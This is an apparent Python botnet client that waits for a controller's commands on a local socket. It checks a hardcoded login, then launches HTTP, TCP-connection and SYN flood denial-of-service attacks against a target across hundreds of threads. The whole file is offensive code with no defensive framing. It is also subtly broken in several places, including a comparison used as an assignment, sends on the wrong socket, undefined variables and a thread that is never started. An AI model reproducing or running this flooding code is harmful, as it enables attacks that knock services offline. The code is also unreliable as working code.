import socket
import sys
import os
import random
from scapy.all import *
import threading
sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.bind(('127.0.0.1',55386))
sock.listen(1)
s,a = sock.accept()
def http_flood(target):
    user_agent = ['Mozilla/5.0 (Windows NT 10.0.25;Win64 x64;) AppleWebKit/542.12(KHTML,like Geoko) Chrome/84.0.2 Safari/537.2.1','Mozilla/5.0 (Windows NT 10.0.32;Win64 x64) AppleWebKit/502.12 Chrome/83.1.0 Safaru/531.35','Moziila/5.0 (Windows NT 10.0;Win32 x32) AppleWebKit/537.12 (KHTML, like Geoko) Safari/537.12 Version/6.3','Mozilla/5.0 (X11; x86_64) ApplewebKit/530.21 (KHTML,like Geoko) Chrome/44.12.3212.143 Safari/512.36','Moziila/5.0 (Mocintosh;Intel Mac OS X 10_7_3) ApplewebKit/531.36 (KHTML,like Geoko) Version/5.7.3 Safari/543.12.3']
    socks = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    socks.connect(target)
    while 1:
        header = 'GET / ?=' + str(random.randint(1,100)) + ' HTTP/1.1\r\nHost: '+str(target) + '\r\n'+'Accept: */*\r\nAccept-Language: es-es,es;q=0.7,de;q=0.5,en-us;q=0.3,en-uk;q=0.5\r\nAccept-Encoding:gzip,deflate\r\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\nContent-Length: 0\r\nConnection: Keep-Alive\r\n\r\n'
        sock.send(str.encode(header))
    sock.send(str.encode('send packet to %s'%(target)))
def syn_flood(target,port):
  while 1:
     ip_package == IP(dst=target)
     tcp = TCP(dport=port,flags='S')
     package = ip_package/tcp
     send(package)
     sock.send(str.encode('send attack to %s'%(target)))
def tcp_flood(target,port):
 while 1:
    for i in socket_lis:
        i.connect(target,port)
        i.close()
command = s.recv(4096).decode()
if command.startswith('login?'):
    cmd = command.replace('login?','').strip().split('\\')
    login = cmd[0][6:]
    passw = cmd[1][5:]
    key = cmd[2][18:]
    if login == 'sean960730':
        if passw == 'sean960730botnet':
            if key == 'jshagdfsjjdhieflsihfdoihfodhfosdjfpdisjdjijif':
                sock.send(str.encode('botcheck'))
                logins = True
elif command.startswith("scan!"):
    cmd=command.replace('scan!','').strip()
    if cmd == 'ghstrefdtuwyerhkduge==':
        sock.send('A')
elif command.startswith('attack?'):
     cmd = command.replace('attack?','').strip()
     cmd2 = sock.recv(4096)
     target = cmd[7:]
     types = cmd2.decode().replace('attack?','')[5:]
     if types == 'http_flood':
        sock.send(str.encode('create 300 thread'))
        for i in range(300):
          if logins == True:
            x=threading.Thread(target=http_flood,args=(target))
            x.start()
          else:
              sys.exit()
     else:
         port = s.recv(4096).decode().replace('attack?','')[5:]
         if types == 'tcp_flood':
           sock.send(str.encode('create 300 thread'))
           for i in range(300):
            if logins == True:
             socket_lis = []
             for i in range(50):
                 socket_lis.append(socket.socket(socket.AF_INET,socket.SOCK_STREAM))
             x = threading.Thread(target=tcp_flood,args=(target,port))
             x.start()
         else:
            if logins == True:
             t = threading.Thread(target=syn_flood,args=(target,port))
             t.start
